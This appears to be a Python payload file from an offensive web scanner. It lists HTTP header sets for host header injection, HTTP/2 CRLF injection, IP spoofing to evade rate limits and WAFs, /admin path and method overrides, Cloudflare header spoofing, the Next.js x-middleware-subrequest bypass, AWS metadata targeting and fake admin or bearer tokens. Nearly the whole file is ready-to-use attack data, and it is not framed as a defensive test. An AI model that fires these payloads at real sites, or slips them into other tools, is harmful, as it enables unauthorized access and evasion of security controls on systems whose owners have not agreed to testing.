"""
HTTP Headers for WAF Bypass, Rate Limiting, Host Injection
"""

# 10. Host header injection payloads
HOST_HEADER_PAYLOADS = [
    {"Host": "evil.com"},
    {"Host": "127.0.0.1"},
    {"Host": "localhost"},
    {"Host": "169.254.169.254"},  # AWS metadata
    {"X-Forwarded-Host": "evil.com"},
    {"X-Host": "evil.com"},
    {"X-Forwarded-Server": "evil.com"},
    {"X-HTTP-Host-Override": "evil.com"},
    {"Forwarded": "host=evil.com"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
]

# 11. HTTP/2 specific bypasses
HTTP2_BYPASS_PAYLOADS = [
    # Pseudo-header manipulation
    {":authority": "evil.com", ":path": "/admin"},
    {":path": "/admin", ":authority": "{host}"},
    # CRLF in HTTP/2
    {":path": "/\r\nX-Injected: header"},
]

# 12. Rate limit bypass headers - comprehensive
RATE_LIMIT_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "{random_ip}"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"Forwarded-For": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-Forwarded-For": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]

# Headers for WAF bypass test - based on FearsOff research
# Account-level WAF rules are also bypassed on ACME path
BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-Host": "localhost"},
    {"X-HTTP-Method-Override": "PUT"},  # Method override trick
    {"X-middleware-subrequest": "1"},   # FearsOff specific test
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Port": "443"},
    
    # ============================================
    # COMPREHENSIVE WAF BYPASS HEADERS
    # ============================================
    
    # IP Spoofing headers
    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-For": "0.0.0.0"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "172.16.0.1"},
    {"X-Forwarded-For": "192.168.0.1"},
    {"X-Forwarded-For": "169.254.169.254"},  # AWS metadata
    {"X-Real-Ip": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-Forwarded-For": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=https"},
    {"Forwarded-For": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"X-Backend-Host": "127.0.0.1"},
    {"X-Originating-IP": "[127.0.0.1]"},
    
    # Host manipulation
    {"Host": "127.0.0.1"},
    {"Host": "localhost"},
    {"Host": "localhost:80"},
    {"Host": "localhost:443"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost:3000"},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Server": "127.0.0.1"},
    {"X-HTTP-Host-Override": "127.0.0.1"},
    
    # URL/Path override
    {"X-Original-URL": "/"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Original-Path": "/admin"},
    {"X-Override-URL": "/admin"},
    
    # Method override
    {"X-HTTP-Method": "PUT"},
    {"X-HTTP-Method-Override": "DELETE"},
    {"X-Method-Override": "PATCH"},
    {"_method": "PUT"},
    
    # Content-Type manipulation
    {"Content-Type": "application/json"},
    {"Content-Type": "application/xml"},
    {"Content-Type": "text/plain"},
    {"Content-Type": "application/x-www-form-urlencoded"},
    {"Content-Type": "multipart/form-data"},
    {"Content-Type": "application/json; charset=utf-8"},
    {"Content-Type": "application/json;charset=UTF-16"},
    {"Content-Type": "text/html"},
    
    # Accept header manipulation
    {"Accept": "*/*"},
    {"Accept": "text/html,application/xhtml+xml"},
    {"Accept": "application/json"},
    {"Accept": "text/x-component"},  # RSC
    {"Accept-Language": "*"},
    {"Accept-Encoding": "identity"},
    
    # Cache bypass
    {"Cache-Control": "no-cache"},
    {"Cache-Control": "no-store"},
    {"Pragma": "no-cache"},
    {"X-Cache-Bypass": "1"},
    {"X-No-Cache": "1"},
    
    # Cloudflare specific bypass
    {"CF-Connecting-IP": "127.0.0.1"},
    {"CF-IPCountry": "XX"},
    {"CF-RAY": "bypass"},
    {"CF-Visitor": '{"scheme":"https"}'},
    {"CF-Worker": "true"},
    {"CDN-Loop": "cloudflare"},
    
    # WAF bypass combinations
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-middleware-subrequest": "1"},
    {"Host": "localhost", "X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/admin", "X-Rewrite-URL": "/admin"},
    
    # Next.js specific
    {"x-middleware-subrequest": "1"},
    {"x-middleware-subrequest": "middleware"},
    {"x-middleware-subrequest": "src/middleware"},
    {"x-middleware-prefetch": "1"},
    {"x-middleware-invoke": "1"},
    {"rsc": "1"},
    {"next-action": "true"},
    {"next-router-prefetch": "1"},
    {"next-router-state-tree": "%5B%22%22%5D"},
    
    # Debug headers
    {"X-Debug": "1"},
    {"X-Debug-Mode": "1"},
    {"Debug": "true"},
    {"X-Forwarded-Debug": "1"},
    
    # Proxy headers
    {"X-ProxyMesh-IP": "127.0.0.1"},
    {"Proxy-Connection": "keep-alive"},
    {"X-Proxy-URL": "http://127.0.0.1/"},
    
    # Authentication bypass
    {"X-Auth-Token": "bypass"},
    {"Authorization": "Bearer bypass"},
    {"X-API-Key": "bypass"},
    {"X-Admin": "true"},
    {"Admin": "true"},
    {"X-Is-Admin": "1"},
]
